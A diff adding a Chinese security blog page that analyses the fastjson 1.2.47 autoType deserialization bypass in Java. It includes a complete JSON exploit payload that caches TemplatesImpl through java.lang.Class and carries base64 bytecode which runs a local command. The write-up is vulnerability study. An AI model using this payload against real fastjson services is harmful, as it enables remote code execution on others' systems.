@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="我司的业务很少用到java所以之前这个漏洞爆出的时候并没有分析，最近想学一下java安全所以也顺便填一下这个坑。 fastjson 1.2.47 autoType 处理机制查看PaserConfig.checkAutoType方法，此方法主要实现类型检验：  typeName的长度介于128与3之间会运行一系列的哈希计算，计算出哈希之后开始判断autoType  这里我们可以看到当autoType">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson1.2.47反序列化分析">
+<meta property="og:url" content="https://hexo.imagemlt.xyz/post/fastjson1-2-47反序列化分析/index.html">
+<meta property="og:site_name" content="Image&#39;s blog">
+<meta property="og:description" content="我司的业务很少用到java所以之前这个漏洞爆出的时候并没有分析，最近想学一下java安全所以也顺便填一下这个坑。 fastjson 1.2.47 autoType 处理机制查看PaserConfig.checkAutoType方法，此方法主要实现类型检验：  typeName的长度介于128与3之间会运行一系列的哈希计算，计算出哈希之后开始判断autoType  这里我们可以看到当autoType">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927201030694_kdpl4p.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569588493/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%888.47.48_d7hdsh.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569589016/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%888.56.20_tazxis.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927200913202_aozcaz.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927200935201_jr8iiv.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587949/blog/fastjson/image-20190927201159172_ev8tqm.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569589961/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%889.11.53_xxsi8l.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587946/blog/fastjson/image-20190927201746911_hmmaek.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587950/blog/fastjson/image-20190927202033346_rdk2n1.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587951/blog/fastjson/image-20190927203146237_f2rp5f.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587949/blog/fastjson/image-20190927202933280_uvpvwn.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587949/blog/fastjson/image-20190927203116745_zkznr0.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569591291/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%889.34.32_halujx.png">
+<meta property="og:updated_time" content="2019-09-27T13:35:12.724Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="fastjson1.2.47反序列化分析">
+<meta name="twitter:description" content="我司的业务很少用到java所以之前这个漏洞爆出的时候并没有分析，最近想学一下java安全所以也顺便填一下这个坑。 fastjson 1.2.47 autoType 处理机制查看PaserConfig.checkAutoType方法，此方法主要实现类型检验：  typeName的长度介于128与3之间会运行一系列的哈希计算，计算出哈希之后开始判断autoType  这里我们可以看到当autoType">
+<meta name="twitter:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927201030694_kdpl4p.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://hexo.imagemlt.xyz/post/fastjson1-2-47反序列化分析/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>fastjson1.2.47反序列化分析 | Image's blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Image's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <h1 class="site-subtitle" itemprop="description">Welcome to Image's Blog</h1>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-links">
+    <a href="/links/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-link"></i> <br>Links</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/fastjson1-2-47反序列化分析/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">fastjson1.2.47反序列化分析
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-09-27 20:41:19 / Modified: 21:35:12" itemprop="dateCreated datePublished" datetime="2019-09-27T20:41:19+08:00">2019-09-27</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>我司的业务很少用到java所以之前这个漏洞爆出的时候并没有分析，最近想学一下java安全所以也顺便填一下这个坑。</p>
+<h3 id="fastjson-1-2-47-autoType-处理机制"><a href="#fastjson-1-2-47-autoType-处理机制" class="headerlink" title="fastjson 1.2.47 autoType 处理机制"></a>fastjson 1.2.47 autoType 处理机制</h3><p>查看<code>PaserConfig.checkAutoType</code>方法，此方法主要实现类型检验：</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927201030694_kdpl4p.png" alt></p>
+<p>typeName的长度介于128与3之间会运行一系列的哈希计算，计算出哈希之后开始判断autoType</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569588493/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%888.47.48_d7hdsh.png" alt></p>
+<p>这里我们可以看到当autoType开启时fastjson会判断这个哈希是否在<code>denyHashCodes</code>中，如果在就会报错。因此也有人fuzz得到了一些黑名单中的类<a href="https://github.com/LeadroyaL/fastjson-blacklist。">https://github.com/LeadroyaL/fastjson-blacklist。</a></p>
+<p>如果autoType没有开启fastjson则会进行如下判断</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569589016/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%888.56.20_tazxis.png" alt></p>
+<p>从TypeUtils的缓存中寻找该类，或者从反序列化表也即白名单中寻找该类。这次的漏洞便是处在TypeUtils建立的缓存中。</p>
+<h2 id="从payload执行过程分析绕过原因"><a href="#从payload执行过程分析绕过原因" class="headerlink" title="从payload执行过程分析绕过原因"></a>从payload执行过程分析绕过原因</h2><p>这次我是用的payload是<code>templateImpl</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"a"</span>:&#123;</span><br><span class="line">  <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">  <span class="string">"val"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span></span><br><span class="line">	&#125;,</span><br><span class="line">  <span class="string">"b"</span>:&#123;</span><br><span class="line">    <span class="string">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,</span><br><span class="line">    <span class="string">"_bytecodes"</span>:[<span class="string">"yv66vgAAADMAOQoACQApCgAqACsIACwKACoALQcALgoABQApCAAvBwAwBwAxAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABVMSmF2YVVuc2VyL1NoZWxsRXhlYzsBAApFeGNlcHRpb25zBwAyAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAzAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHADABAApTb3VyY2VGaWxlAQAOU2hlbGxFeGVjLmphdmEMAAoACwcANAwANQA2AQASb3BlbiAtYSBDYWxjdWxhdG9yDAA3ADgBABNKYXZhVW5zZXIvU2hlbGxFeGVjAQARdG91Y2ggL3RtcC9uaW1hZGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAJAAAAAAAFAAEACgALAAIADAAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgANAAAADgADAAAAEwAEABQADQAVAA4AAAAMAAEAAAAOAA8AEAAAABEAAAAEAAEAEgABABMAFAABAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAGAAOAAAAKgAEAAAAAQAPABAAAAAAAAEAFQAWAAEAAAABABcAGAACAAAAAQAZABoAAwABABMAGwACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAGwAOAAAAIAADAAAAAQAPABAAAAAAAAEAFQAWAAEAAAABABwAHQACABEAAAAEAAEAHgAJAB8AIAACAAwAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAA0AAAAKAAIAAAAeAAgAHwAOAAAAFgACAAAACQAhACIAAAAIAAEAIwAQAAEAEQAAAAQAAQAIAAgAJAALAAEADAAAAE8AAgABAAAADrgAAhIHtgAEV6cABEuxAAEAAAAJAAwACAADAA0AAAASAAQAAAAOAAkAEQAMAA8ADQASAA4AAAACAAAAJQAAAAcAAkwHACYAAAEAJwAAAAIAKA=="</span>],</span><br><span class="line">    <span class="string">"_name"</span>:<span class="string">"a.b"</span>,</span><br><span class="line">    <span class="string">"_tfactory"</span>:&#123; &#125;,</span><br><span class="line">    <span class="string">"_outputProperties"</span>:&#123; &#125;,</span><br><span class="line">    <span class="string">"_name"</span>:<span class="string">"a"</span>,</span><br><span class="line">    <span class="string">"_version"</span>:<span class="string">"1.0"</span>,</span><br><span class="line">    <span class="string">"allowedProtocols"</span>:<span class="string">"all"</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>IDEA启动调试看一下为什么这个payload能绕过autoType限制。</p>
+<p>反序列化流程的主要出发点在</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927200913202_aozcaz.png" alt></p>
+<p>我们跟进<code>DefaultJSONParser.parse</code>方法，开始是很多的lexer解析相关的操作。直接跳到对key为<code>@type</code>的处理</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587945/blog/fastjson/image-20190927200935201_jr8iiv.png" alt></p>
+<p>这里走到了我们之前提到的checkAutoType的操作，此时我们的类型为<code>java.lang.Class</code>，跟进checkAutoType分析，首先会进入<code>TypeUtils.getClassFromMapping</code>中看此类是否存在于我们的缓存类中。我们可以下断点看一下缓存类中都有哪些东西</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587949/blog/fastjson/image-20190927201159172_ev8tqm.png" alt></p>
+<p>这个map中并没有我们想要的<code>java.lang.Class</code>,且此时也没有我们想要的<code>templatesImpl</code>类。</p>
+<p>继续跟进可以看到<code>java.lang.Class</code>正在<code>ParseConfig.deserializers</code>中</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569589961/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%889.11.53_xxsi8l.png" alt></p>
+<p>因此我们可以直接得到我们该类型。</p>
+<p>获取类型后继续跟进可以看到会用<code>java.lang.Class</code>的反序列化器即<code>MiscCodec</code>来反序列化<code>java.lang.Class</code>类。</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587946/blog/fastjson/image-20190927201746911_hmmaek.png" alt></p>
+<p>跟进反序列化过程，又是一段很长的编译原理相关的lexer解析过程。解析出来<code>val</code>的键<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587950/blog/fastjson/image-20190927202033346_rdk2n1.png" alt></p>
+<p>之后便进行类的反序列化过程，在判断了是否为一些类之后进入如下分支</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587951/blog/fastjson/image-20190927203146237_f2rp5f.png" alt></p>
+<p>进入<code>TypeUtils.loadClass</code>方法，可以看到这次会通过classLoader生成类后把<code>TemplatesImpl</code>放到缓存map中</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587949/blog/fastjson/image-20190927202933280_uvpvwn.png" alt></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569587949/blog/fastjson/image-20190927203116745_zkznr0.png" alt></p>
+<p>我们想要的类已经进入了mapping。</p>
+<p>之后序列化<code>b</code>时mapping中存在<code>TemplatesImpl</code>类可以返回我们的TemplatesImpl类了,一切操作便像之前的反序列化漏洞相同了，通过<code>JavaBeanDeserializer.deserialze</code>来调用TemplatesImpl类的setXXX方法来RCE.可以参考<a href="http://hexo.imagemlt.xyz/post/java-unserialize-learning-3/index.html">http://hexo.imagemlt.xyz/post/java-unserialize-learning-3/index.html</a>.</p>
+<p>最后放个弹计算器的图片来结束这篇文章。web安全虽然入门容易，但是要成为跟orange等大牛一样厉害的国际大黑客还是需要学很多很多。</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1569591291/blog/fastjson/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-09-27_%E4%B8%8B%E5%8D%889.34.32_halujx.png" alt></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/XNUCA-qualifier-md/index.html" rel="next" title="XNUCA qualifier writeup">
+                <i class="fa fa-chevron-left"></i> XNUCA qualifier writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
+            
+              <p class="site-author-name" itemprop="name">Imagemlt</p>
+              <p class="site-description motion-element" itemprop="description">personal blog</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/imagemlt" target="_blank" title="GitHub" rel="external nofollow"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson-1-2-47-autoType-处理机制"><span class="nav-number">1.</span> <span class="nav-text">fastjson 1.2.47 autoType 处理机制</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#从payload执行过程分析绕过原因"><span class="nav-number"></span> <span class="nav-text">从payload执行过程分析绕过原因</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Imagemlt</span>
+
+  
+
+  
+</div>
+
+
+  
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+  <script src="https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js"></script>
+  <script>
+    if (window.mermaid) {
+//alert("mermaid!!!");
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
